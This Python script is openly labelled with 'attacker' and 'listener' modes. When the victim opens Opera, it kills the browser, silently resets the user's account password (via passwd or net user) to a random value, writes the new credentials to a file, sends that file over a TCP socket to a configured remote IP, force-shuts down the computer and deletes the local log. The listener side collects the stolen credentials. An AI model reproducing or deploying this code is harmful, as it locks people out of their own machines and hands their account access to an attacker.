import subprocess
import sys
import os
import time
import getpass
import socket
import string
import random
import platform

# --- CONFIGURATION ---
TARGET_IP_ADDRESS = ""
TARGET_PORT = 12345
LOG_FILE = "new_credentials.txt"
LISTENER_MODE = False
RECEIVED_CREDENTIALS_FILE = "/tmp/received_credentials.txt" if not sys.platform.startswith("win") else "received_credentials.txt"
TARGET_USERNAME = "kali"  # Default, will attempt to use current user if sudo/admin

# --- UTILITY FUNCTIONS ---
def change_user_credentials(new_password="today", target_username=None):
    """
    Changes the password of a specified user.
    Handles different operating systems. Requires appropriate privileges.
    """
    try:
        if sys.platform.startswith("linux"):
            effective_username = target_username if target_username else getpass.getuser()
            if 'SUDO_UID' in os.environ:
                print(f"Running with sudo privileges. Will attempt to change password for user: {effective_username}")
                process = subprocess.Popen(['sudo', 'passwd', effective_username],
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         text=True)
                process.communicate(input=f"{new_password}\n{new_password}\n")
                result = process.returncode
                if result == 0:
                    print("Password changed successfully.")
                    return 0
                else:
                    print(f"Error: Password change failed. Error Code: {result} Stderr: {process.stderr}", file=sys.stderr)
                    return result
            else:
                print("Error: This script must be run with sudo privileges to change the password without prompting on Linux.", file=sys.stderr)
                return 1
        elif sys.platform.startswith("win"):
            effective_username = target_username if target_username else getpass.getuser()
            print(f"Attempting to change password for user: {effective_username}")
            command = ["net", "user", effective_username, new_password]
            process = subprocess.Popen(command,
                                     stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True)
            stdout, stderr = process.communicate()
            result = process.returncode
            if result == 0:
                print("Password changed successfully.")
                return 0
            else:
                print(f"Error: Password change failed. Error Code: {result} Stderr: {stderr}", file=sys.stderr)
                return result
        elif sys.platform.startswith("darwin"):
            effective_username = target_username if target_username else getpass.getuser()
            print(
                f"Warning: Changing passwords programmatically on macOS typically requires administrative privileges and using the 'dscl' command. This is not fully implemented. Will attempt for current user if no target specified.")
            if not target_username:
                process = subprocess.Popen(['passwd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         text=True)
                stdout, stderr = process.communicate(input=f"{new_password}\n{new_password}\n")
                if "all authentication tokens have been successfully updated" in stdout:
                    print("Password changed successfully (for current user).")
                    return 0
                else:
                    print(f"Error changing password (macOS): {stderr}", file=sys.stderr)
                    return process.returncode
            else:
                print(
                    f"Changing password for a different user ({target_username}) on macOS requires more complex handling with 'dscl' and likely root privileges. This is not implemented.")
                return 1
        else:
            print("Operating system not supported for password change.", file=sys.stderr)
            return 1
    except FileNotFoundError:
        print("Error: The 'passwd', 'tasklist', 'pgrep', 'net' or 'dscl' command was not found.", file=sys.stderr)
        return 127
    except Exception as e:
        print(f"An unexpected error occurred during password change: {e}", file=sys.stderr)
        return 1


def is_opera_running():
    """Checks if the Opera browser is currently running (OS-dependent)."""
    try:
        if sys.platform.startswith('win'):
            process = subprocess.Popen(['tasklist', '/FI', 'IMAGENAME eq opera.exe'],
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return b'opera.exe' in stdout
        elif sys.platform.startswith('linux'):
            process = subprocess.Popen(['pgrep', 'opera'],
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return len(stdout) > 0
        elif sys.platform.startswith('darwin'):
            process = subprocess.Popen(['pgrep', 'Opera'],
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return len(stdout) > 0
        else:
            print("Warning: OS not fully supported for Opera check.")
            return True
    except Exception as e:
        print(f"Error checking for Opera: {e}")
        return False

def is_opera_installed_full_scan():
    """
    Performs a full system scan to check if Opera browser is installed.
    This can be time-consuming.

    Returns:
        str or None: The full path to a potential Opera executable or application bundle if found, None otherwise.
    """
    print("Starting full system scan for Opera. This may take a while...")

    if platform.system() == "Windows":
        for root, _, files in os.walk("C:\\"):
            for file in files:
                if file.lower() == "opera.exe":
                    print(f"Found potential Opera executable at: {os.path.join(root, file)}")
                    return os.path.join(root, file)
    elif platform.system() == "Darwin":  # macOS
        for root, _, files in os.walk("/Applications"):
            for file in files:
                if file.lower() == "opera.app":
                    print(f"Found potential Opera application bundle at: {os.path.join(root, file)}")
                    return os.path.join(root, file)
                elif file.lower() == "opera":
                    # Check inside application bundles
                    app_path = os.path.join(root, file)
                    if os.path.isdir(app_path) and "Contents" in os.listdir(app_path) and "MacOS" in os.listdir(
                            os.path.join(app_path, "Contents")):
                        if "opera" in (f.lower() for f in os.listdir(os.path.join(app_path, "Contents", "MacOS"))):
                            print(f"Found potential Opera executable within bundle at: {app_path}")
                            return app_path
    elif platform.system() == "Linux":
        for root, _, files in os.walk("/"):
            for file in files:
                if file.lower() == "opera":
                    # Basic check for executable name
                    print(f"Found potential Opera executable at: {os.path.join(root, file)}")
                    return os.path.join(root, file)

    print("Full system scan complete.")
    return None


def kill_opera():
    """Kills any running Opera processes (OS-dependent)."""
    try:
        print("Killing Opera processes...")
        if sys.platform.startswith('win'):
            subprocess.run(['taskkill', '/F', '/IM', 'opera.exe'],
                             check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['killall', '-q', 'opera'],
                             check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            subprocess.run(['killall', '-q', 'Opera'],
                             check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print("Warning: OS not fully supported for killing Opera.")
            return
        time.sleep(2)
        print("Opera processes killed (attempted).")
    except subprocess.CalledProcessError as e:
        print(f"Error killing Opera: {e}")



def shutdown_computer():
    """Shuts down the computer (OS-dependent, requires admin/root privileges)."""
    try:
        print("Shutting down the computer...")
        if sys.platform.startswith('win'):
            subprocess.run(['shutdown', '/s', '/f'],
                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['shutdown', '-h', 'now'],
                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            subprocess.run(['shutdown', '-h', 'now'],
                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print("Warning: OS not fully supported for shutdown.")
            return
        print("Shutdown command executed.")
    except subprocess.CalledProcessError as e:
        print(f"Error shutting down: {e}")



def generate_random_string(length=12):
    """Generates a random string."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))



def log_credentials(username, password, log_file):
    """Logs the username and password to a text file."""
    try:
        with open(log_file, "w") as f:
            f.write(f"New Username (Attempted): {username}\n")
            f.write(f"New Password: {password}\n")
        print(f"Credentials logged to: {log_file}")
        return True
    except Exception as e:
        print(f"Error logging credentials: {e}")
        return False



def listener_main():
    """Main function for the listening machine."""
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = TARGET_PORT
    received_file_path = RECEIVED_CREDENTIALS_FILE

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            print(f"Listening on port {PORT}...")
            conn, addr = s.accept()
            with conn:
                print(f"Connected by {addr}")
                with open(received_file_path, 'wb') as f:
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        f.write(data)
                print(f"Credentials received and saved to {received_file_path}")
    except KeyboardInterrupt:
        print("\nListener interrupted.")
    except Exception as e:
        print(f"An error occurred in the listener: {e}")
    finally:
        if 's' in locals() and s.fileno() != -1:
            s.close()



def attacker_main():
    """Main function for the attacking machine."""
    if sys.platform.startswith("linux") and os.geteuid() != 0:
        print("Error: This script requires root privileges (sudo) on Linux to change passwords.")
        return

    if sys.platform.startswith("win"):
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Error: This script requires administrator privileges on Windows to change passwords.")
            return

    print("And it begins :P")

    # Perform the full system scan first
    opera_path = is_opera_installed_full_scan()

    if opera_path:
        print("Opera browser appears to be installed.")
    else:
        print("Opera browser was not found on this system. Exiting.")
        return  # Exit if Opera is not found

    print("Waiting for Opera to be opened by the user...")
    while not is_opera_running():
        time.sleep(5)
    print("Opera process detected. Proceeding...")

    kill_opera()

    new_password = generate_random_string(12)
    current_username = getpass.getuser()
    target_user = TARGET_USERNAME if sys.platform.startswith("linux") else current_username  # On non-Linux, attempt for current user

    print(f"New Password Generated XXX")

    password_changed = change_user_credentials(new_password, target_user)
    print("Attempting to change user credentials...")

    if password_changed == 0:
        print("User credentials changed successfully (or attempted). Proceeding to log and send file.")
        if log_credentials(current_username, new_password, LOG_FILE):
            target_ip = TARGET_IP_ADDRESS
            target_port = TARGET_PORT
            credentials_file = LOG_FILE

            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((target_ip, target_port))
                    with open(credentials_file, 'rb') as f:
                        while True:
                            data = f.read(1024)
                            if not data:
                                break
                            s.sendall(data)
                # print(f"Credentials file '{credentials_file}' sent to {target_ip}:{target_port}")
            except ConnectionRefusedError:
                print(
                    f"Error: Connection to {target_ip}:{target_port} refused. Ensure the listener is running on the target machine and the port is open.")
            except Exception as e:
                print(f"An error occurred while sending: {e}")
            finally:
                shutdown_computer()
                try:
                    os.remove(credentials_file)  # Remove the file
                    # print(f"Log file '{credentials_file}' removed.")
                except Exception as e:
                    print(f"Error removing log file: {e}")
        else:
            print("Failed to log credentials. Shutdown aborted.")
    else:
        print("Failed to change user credentials. Shutdown aborted.")



# --- MAIN EXECUTION BLOCK ---
if __name__ == "__main__":
    if LISTENER_MODE:
        print(f"Running as listener on {sys.platform}...")
        listener_main()
    else:
        print(f"Running as attacker on {sys.platform}...")
        attacker_main()
